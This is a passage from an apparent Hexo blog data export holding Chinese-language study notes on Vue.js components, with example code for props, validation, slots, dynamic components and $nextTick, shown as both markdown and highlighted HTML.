class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Value1:&#123;&#123; value1 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Value2:&#123;&#123; value2 &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-3-修饰符\"><a href=\"#6-3-修饰符\" class=\"headerlink\" title=\"6.3 修饰符\"></a>6.3 修饰符</h3><p>​    1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.lazy<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model.lazy</span>=<span class=\"hljs-string\">&quot;lazy&quot;</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Lazy:&#123;&#123; lazy &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.numebr<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">v-model.number</span>=<span class=\"hljs-string\">&quot;number&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>number:&#123;&#123; number &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    3 v-model.trim 去除首尾空白；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>.trim<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">v-model.trim</span>=<span class=\"hljs-string\">&quot;trim&quot;</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>trim:&#123;&#123; trim &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span> <br></code></pre></td></tr></table></figure>\n\n"},{"title":"Vue.js实战（5）","date":"2020-11-27T13:18:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n# Ch7 组件详解\n\n### 1.组件的创建使用\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n        <my-component1></my-component1>\n    </div>\n\n    <script>\n\n        Vue.component('my-component1',{\n            template:'<div><p>This is my component1</p></div>'\n        });\n\n\n        var app=new Vue({\n            el:\"#app\",\n        });\n    </script>\n</body>\n</html>\n```\n\n注意： a.组件需要注册之后才可以使用；\tb.组件template中必须被一个元素包含，如\\<div>\\</div>\n\n​\t\t   c.组件可以使用data,methods,computed; data必须是函数，然后return；\n\n### 2.组件数据的使用\n\n三个组件都能实现自增,但是数据互不影响\n\n```html\n <div id=\"app\">\n        <my-component2></my-component2>\n        <my-component2></my-component2>\n        <my-component2></my-component2>\n    </div>\n    \n      Vue.component('my-component2',{\n            template:'<div>       <p>Counter:</p><p>{{ count }}</p><button type=\"button\" @click=\"count++\">+1</button></div>',\n            data:function(){\n                return{\n                    count:0\n                } \n            }\n        });\n```\n\n3. ### 使用props传递数据\n\n   ​\t1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；\n   \n   ```html\n    <my-component3 message=\"来自父组件的数据！！\"></my-component3>\n    \n    \n           Vue.component('my-component3', {\n               props: ['message'],\n               template: '<div>{{ message }}</div>'\n           });\n   ```\n   \n   ​\t2.小细节\n\n```\n  <my-component2 message=\"[1,2,3]\"></my-component2>   //messgae.length=7\n  <my-component2 :message=\"[1,2,3]\"></my-component2>\t//messgae.length=3 数组长度\n```\n\n​\t\t 3.单向数据流：父级->子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；\n\n​\t\t 4.数据验证\n\n```javascript\n  Vue.component('data-validator',{\n            props:{\n                propA:Number,\n                propB:[String,Number],\n                propC:{\n                    type:Boolean,\n                    default:true\n                },\n                propD:{\n                    type:Number,\n                    required:true\n                },\n                propE:{\n                    type:Array,\n                    dafault:function(){\n                        return [];\n                    },\n                //自定义验证器\n                propF:{\n                    validator:function(value){\n                        return value>10;\n                    }\n                }\n                }\n            }\n        });\n```\n\n4.组件通信\n\n​\t1.自定义事件：子组件向父组件传递数据\n\n​\t2.双向绑定的v-model组件需要满足下面两个要求：\n\n​\t\t\t\t*接受一个value属性\n\n  \t\t\t *在有新的value前出发input事件\n\n​\t3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信\n\n​\t4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit\n\n​\t5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）\n\n### 4.使用slot分发内容\n\n当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；\n\nprops传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；\n\n​\t1.作用域\n\n```html\n<child-component>\n\t{{ message }}  //绑定父组件的数据\n</child-component>\n\n\n<child-component v-show=\"showMe\"></child-component> //绑定的是父组件\n\nvar app=new Vue({\n    el:\"#app\",\n    data:{\n    showMe: True;\n}\n});\n\n<child-component v-show=\"showMe\"></child-component> //绑定的是子组件\n\nVue.component('child-component',{\ntemplate:'<div v-show=\"showMe\"></div>',\ndata:function(){\n\tretunr {\n\t\t\tshowMe:True\n}\n}\n})\n\n```\n\n​\t2.slot用法\n\n​\t\t\t\t单个slot\n\n```html\n <div id=\"app\">\n        <child-component></child-component>\n\n        <child-component>\n            <p>Car~~</p>\n    </child-component>\n    </div>\n    <script>\n        Vue.component('child-component', {\n            template: \"\\\n            <div>\\\n                <slot>\\\n                    <p>您的购物车空空如也！</p>\\\n                </slot>\\\n            </div>\",\n\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n​\t\t\t\t具名slot和单个slot混用\n\n```html\n<div id=\"app\">\n        <child-component>\n            <h2 slot=\"header\">此去经年</h2>\n            <p>从前车马很慢，书信很慢，一生只够爱一个人。</p>\n            <div slot=\"footer\">Writted By GuiGui</div>\n        </child-component>\n    </div>\n\n    <script>\n        Vue.component('child-component', {\n            template: '\\\n            <div class=\"container\">\\\n                <div class=\"header\">\\\n                    <slot name=\"header\"></slot>\\\n                </div>\\\n                <div class=\"main\">\\\n                    <slot></slot>\\\n                </div>\\\n                <div class=\"footer\">\\\n                    <slot name=\"footer\"></slot>\\\n                </div>\\\n            </div>',\n        });\n\n```\n\n​\t3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？\n\n​\t4.访问slot：this.$slot.name;\n\n### 5.组件高级用法\n\n​\t1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；\n\n​\t注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;\n\n​\t2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；\n\n​\t3.动态组件：vue.js提供了一个特殊元素\\<component>用来挂载不同的组件，使用is特性来选择需要挂载的组件\n\n```html\n <div id=\"app\">\n        <component :is=\"currentChoose\"></component>\n        <button @click=\"handleChangeView('A')\">红灯</button>\n        <button @click=\"handleChangeView('B')\">黄灯</button>\n        <button @click=\"handleChangeView('C')\">绿灯</button>\n    </div>\n\n \n    <script>\n\n\n\n        var app = new Vue({\n            el: \"#app\",\n            components:{\n                comA:{\n                    template:'<div style=\"color: red;\">A组件</div>'\n                },\n                comB:{\n                    template:'<div style=\"color: yellow;\">B组件</div>'\n                },\n                comC:{\n                    template:'<div style=\"color: green;\">C组件</div>'\n                },\n            },\n            data: {\n                currentChoose:'comA',\n            },\n            methods: {\n                handleChangeView:function(component){\n                    this.currentChoose='com'+component;\n                },\n            },\n        })\n    </script>\n```\n\n​\t4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）\n\n### 6其他\n\n​\t1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；\n\n```html\n <div id=\"app\">\n        <div id=\"div\" v-if=\"showText\">This is show me text;</div>\n        <button @click=\"showMeText\">点击显示文本</button>\n    </div>\n\n\n    <script>\n\n\n\n        var app = new Vue({\n            el: \"#app\",\n            data: {\n                showText: false\n            },\n            methods: {\n                showMeText: function () {\n                    this.showText = true;\n                    this.$nextTick(function(){\n                        var text=document.getElementById('div').innerHTML;\n                        console.log(text);\n                    });\n                }\n            }\n        })\n    </script>\n```\n\n​\t2.手动挂载实例$mount","source":"_posts/Vue.js实战（5）.md","raw":"---\ntitle: Vue.js实战（5）\ndate: 2020-11-27 21:18:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n# Ch7 组件详解\n\n### 1.组件的创建使用\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n        <my-component1></my-component1>\n    </div>\n\n    <script>\n\n        Vue.component('my-component1',{\n            template:'<div><p>This is my component1</p></div>'\n        });\n\n\n        var app=new Vue({\n            el:\"#app\",\n        });\n    </script>\n</body>\n</html>\n```\n\n注意： a.组件需要注册之后才可以使用；\tb.组件template中必须被一个元素包含，如\\<div>\\</div>\n\n​\t\t   c.组件可以使用data,methods,computed; data必须是函数，然后return；\n\n### 2.组件数据的使用\n\n三个组件都能实现自增,但是数据互不影响\n\n```html\n <div id=\"app\">\n        <my-component2></my-component2>\n        <my-component2></my-component2>\n        <my-component2></my-component2>\n    </div>\n    \n      Vue.component('my-component2',{\n            template:'<div>       <p>Counter:</p><p>{{ count }}</p><button type=\"button\" @click=\"count++\">+1</button></div>',\n            data:function(){\n                return{\n                    count:0\n                } \n            }\n        });\n```\n\n3. ### 使用props传递数据\n\n   ​\t1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；\n   \n   ```html\n    <my-component3 message=\"来自父组件的数据！！\"></my-component3>\n    \n    \n           Vue.component('my-component3', {\n               props: ['message'],\n               template: '<div>{{ message }}</div>'\n           });\n   ```\n   \n   ​\t2.小细节\n\n```\n  <my-component2 message=\"[1,2,3]\"></my-component2>   //messgae.length=7\n  <my-component2 :message=\"[1,2,3]\"></my-component2>\t//messgae.length=3 数组长度\n```\n\n​\t\t 3.单向数据流：父级->子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；\n\n​\t\t 4.数据验证\n\n```javascript\n  Vue.component('data-validator',{\n            props:{\n                propA:Number,\n                propB:[String,Number],\n                propC:{\n                    type:Boolean,\n                    default:true\n                },\n                propD:{\n                    type:Number,\n                    required:true\n                },\n                propE:{\n                    type:Array,\n                    dafault:function(){\n                        return [];\n                    },\n                //自定义验证器\n                propF:{\n                    validator:function(value){\n                        return value>10;\n                    }\n                }\n                }\n            }\n        });\n```\n\n4.组件通信\n\n​\t1.自定义事件：子组件向父组件传递数据\n\n​\t2.双向绑定的v-model组件需要满足下面两个要求：\n\n​\t\t\t\t*接受一个value属性\n\n  \t\t\t *在有新的value前出发input事件\n\n​\t3.使用中央时间总线Bus实现父子，兄弟，跨级的组件间通信\n\n​\t4.父链 this.$parent   this.$children  尽管Vue允许这样的操作，业务中，子组件应该尽可能避免以来父组件的数据（解耦？？）建议使用props和$emit\n\n​\t5.子组件索引：通过$refs来获取子组件实现（注意：$refs只在组件渲染完成之后才填充，并且他是非响应式的。仅仅作为一个应急方案，应当避免再模板和计算属性中使用$refs）\n\n### 4.使用slot分发内容\n\n当需要让组件组合使用，混合父组件的内容和子组件的模板时，用到slot，成为内容分发；\n\nprops传递数据，events触发事件，slot内容分发构成了Vue组建的3个API来源；\n\n​\t1.作用域\n\n```html\n<child-component>\n\t{{ message }}  //绑定父组件的数据\n</child-component>\n\n\n<child-component v-show=\"showMe\"></child-component> //绑定的是父组件\n\nvar app=new Vue({\n    el:\"#app\",\n    data:{\n    showMe: True;\n}\n});\n\n<child-component v-show=\"showMe\"></child-component> //绑定的是子组件\n\nVue.component('child-component',{\ntemplate:'<div v-show=\"showMe\"></div>',\ndata:function(){\n\tretunr {\n\t\t\tshowMe:True\n}\n}\n})\n\n```\n\n​\t2.slot用法\n\n​\t\t\t\t单个slot\n\n```html\n <div id=\"app\">\n        <child-component></child-component>\n\n        <child-component>\n            <p>Car~~</p>\n    </child-component>\n    </div>\n    <script>\n        Vue.component('child-component', {\n            template: \"\\\n            <div>\\\n                <slot>\\\n                    <p>您的购物车空空如也！</p>\\\n                </slot>\\\n            </div>\",\n\n        });\n\n        var app = new Vue({\n            el: \"#app\",\n        })\n    </script>\n```\n\n​\t\t\t\t具名slot和单个slot混用\n\n```html\n<div id=\"app\">\n        <child-component>\n            <h2 slot=\"header\">此去经年</h2>\n            <p>从前车马很慢，书信很慢，一生只够爱一个人。</p>\n            <div slot=\"footer\">Writted By GuiGui</div>\n        </child-component>\n    </div>\n\n    <script>\n        Vue.component('child-component', {\n            template: '\\\n            <div class=\"container\">\\\n                <div class=\"header\">\\\n                    <slot name=\"header\"></slot>\\\n                </div>\\\n                <div class=\"main\">\\\n                    <slot></slot>\\\n                </div>\\\n                <div class=\"footer\">\\\n                    <slot name=\"footer\"></slot>\\\n                </div>\\\n            </div>',\n        });\n\n```\n\n​\t3.作用域插槽：使用一个可复用的模板替代已渲染元素。？？？\n\n​\t4.访问slot：this.$slot.name;\n\n### 5.组件高级用法\n\n​\t1.递归组件：组件在他的模板内递归调用自己，只要给组件设置name即可；可以用于开发具未知层级关系的独立组件；\n\n​\t注：必须设置一个条件来限制递归数量，否则抛出错误：max stack size exceeded;\n\n​\t2.内联模板：给组件标签使用inline-template特性，组件会把它的内容当作模板；\n\n​\t3.动态组件：vue.js提供了一个特殊元素\\<component>用来挂载不同的组件，使用is特性来选择需要挂载的组件\n\n```html\n <div id=\"app\">\n        <component :is=\"currentChoose\"></component>\n        <button @click=\"handleChangeView('A')\">红灯</button>\n        <button @click=\"handleChangeView('B')\">黄灯</button>\n        <button @click=\"handleChangeView('C')\">绿灯</button>\n    </div>\n\n \n    <script>\n\n\n\n        var app = new Vue({\n            el: \"#app\",\n            components:{\n                comA:{\n                    template:'<div style=\"color: red;\">A组件</div>'\n                },\n                comB:{\n                    template:'<div style=\"color: yellow;\">B组件</div>'\n                },\n                comC:{\n                    template:'<div style=\"color: green;\">C组件</div>'\n                },\n            },\n            data: {\n                currentChoose:'comA',\n            },\n            methods: {\n                handleChangeView:function(component){\n                    this.currentChoose='com'+component;\n                },\n            },\n        })\n    </script>\n```\n\n​\t4.异步组件：仅仅加载需要的组件，提高性能；（vue允许将组件定义为一个工厂函数，动态的解析组件，只在组件需要渲染时触发工厂函数，并且将结果缓存，用于再次渲染）\n\n### 6其他\n\n​\t1.$nextTick 异步更新队列：vue仅仅会绘制最后一次改变，英雌因此当showtext=true的时候，其实还没有创建这个div，需要等到下一次刷新；\n\n```html\n <div id=\"app\">\n        <div id=\"div\" v-if=\"showText\">This is show me text;</div>\n        <button @click=\"showMeText\">点击显示文本</button>\n    </div>\n\n\n    <script>\n\n\n\n        var app = new Vue({\n            el: \"#app\",\n            data: {\n                showText: false\n            },\n            methods: {\n                showMeText: function () {\n                    this.showText = true;\n                    this.$nextTick(function(){\n                        var text=document.getElementById('div').innerHTML;\n                        console.log(text);\n                    });\n                }\n            }\n        })\n    </script>\n```\n\n​\t2.手动挂载实例$mount","slug":"Vue.js实战（5）","published":1,"updated":"2020-11-27T13:20:50.000Z","_id":"clg29vyhh003vao9cddbkbpni","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch7-组件详解\"><a href=\"#Ch7-组件详解\" class=\"headerlink\" title=\"Ch7 组件详解\"></a>Ch7 组件详解</h1><h3 id=\"1-组件的创建使用\"><a href=\"#1-组件的创建使用\" class=\"headerlink\" title=\"1.组件的创建使用\"></a>1.组件的创建使用</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component1</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component1</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;my-component1&#x27;</span>,&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">template</span>:<span class=\"hljs-string\">&#x27;&lt;div&gt;&lt;p&gt;This is my component1&lt;/p&gt;&lt;/div&gt;&#x27;</span></span><br><span class=\"language-javascript\">        &#125;);</span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">        &#125;);</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>注意： a.组件需要注册之后才可以使用；    b.组件template中必须被一个元素包含，如&lt;div&gt;&lt;/div&gt;</p>\n<p>​           c.组件可以使用data,methods,computed; data必须是函数，然后return；</p>\n<h3 id=\"2-组件数据的使用\"><a href=\"#2-组件数据的使用\" class=\"headerlink\" title=\"2.组件数据的使用\"></a>2.组件数据的使用</h3><p>三个组件都能实现自增,但是数据互不影响</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component2</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component2</span>&gt;</span><br>   <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>   <br>     Vue.component(&#x27;my-component2&#x27;,&#123;<br>           template:&#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>       <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>Counter:<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;button&quot;</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;count++&quot;</span>&gt;</span>+1<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;,<br>           data:function()&#123;<br>               return&#123;<br>                   count:0<br>               &#125; <br>           &#125;<br>       &#125;);<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><h3 id=\"使用props传递数据\"><a href=\"#使用props传递数据\" class=\"headerlink\" title=\"使用props传递数据\"></a>使用props传递数据</h3><p>​    1.组件除了复用以外，更重要的是组件之间的通信；props中声明的数据与组件data函数return的数据主要区别是props的来自父级，而data中的组件是自己的数据，作用域是组件本身；这两种数据都可以在template、computed和methods中使用；</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">my-component3</span> <span class=\"hljs-attr\">message</span>=<span class=\"hljs-string\">&quot;来自父组件的数据！！&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">my-component3</span>&gt;</span><br><br><br>       Vue.component(&#x27;my-component3&#x27;, &#123;<br>           props: [&#x27;message&#x27;],<br>           template: &#x27;<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>&#x27;<br>       &#125;);<br></code></pre></td></tr></table></figure>\n\n<p>​    2.小细节</p>\n</li>\n</ol>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs elixir\">&lt;my-component2 message=<span class=\"hljs-string\">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;   //messgae.length=<span class=\"hljs-number\">7</span><br>&lt;my-component2 <span class=\"hljs-symbol\">:message=<span class=\"hljs-string\">&quot;[1,2,3]&quot;</span>&gt;&lt;/my-component2&gt;</span>\t//messgae.length=<span class=\"hljs-number\">3</span> 数组长度<br></code></pre></td></tr></table></figure>\n\n<p>​         3.单向数据流：父级-&gt;子级，解耦，避免子级操作父级数据；若props作为需要抓变得原始值，可以用计算属性；</p>\n<p>​         4.数据验证</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-title class_\">Vue</span>.<span class=\"hljs-title function_\">component</span>(<span class=\"hljs-string\">&#x27;data-validator&#x27;</span>,&#123;<br>          <span class=\"hljs-attr\">props</span>:&#123;<br>              <span class=\"hljs-attr\">propA</span>:<span class=\"hljs-title class_\">Number</span>,<br>              <span class=\"hljs-attr\">propB</span>:[<span class=\"hljs-title class_\">String</span>,<span class=\"hljs-title class_\">Number</span>],<br>              <span class=\"hljs-attr\">propC</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Boolean</span>,<br>                  <span class=\"hljs-attr\">default</span>:<span class=\"hljs-literal\">true</span><br>              &#125;,<br>              <span class=\"hljs-attr\">propD</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Number</span>,<br>                  <span class=\"hljs-attr\">required</span>:<span class=\"hljs-literal\">true</span><br>              &#125;,<br>              <span class=\"hljs-attr\">propE</span>:&#123;<br>                  <span class=\"hljs-attr\">type</span>:<span class=\"hljs-title class_\">Array</span>,<br>                  <span class=\"hljs-attr\">dafault</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>                      <span class=\"hljs-keyword\">return</span> [];<br>                  &#125;,<br>              <span class=\"hljs-comment\">//自定义验证器</span><br>              <span class=\"hljs-attr\">propF</span>:&#123;<br>                  <span class=\"hljs-attr\">validator</span>:<span 